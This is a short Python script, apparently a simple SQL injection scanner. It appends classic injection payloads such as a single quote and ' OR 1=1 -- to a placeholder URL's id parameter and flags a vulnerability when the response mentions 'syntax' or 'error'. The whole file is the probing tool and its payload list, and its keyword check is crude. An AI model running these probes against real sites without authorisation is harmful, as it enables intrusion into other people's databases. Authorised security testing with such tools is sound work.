import requests

url = 'http://example.com/?id=1'
payloads = ["'", "' OR 1=1 --", '"', '" OR 1=1 --']

for payload in payloads:
    test_url = f"{url}{payload}"
    response = requests.get(test_url)
    if 'syntax' in response.text or 'error' in response.text:
        print(f"Potential SQL Injection Vulnerability found with payload: {payload}")
        break
else:
    print('No SQL Injection vulnerabilities found')
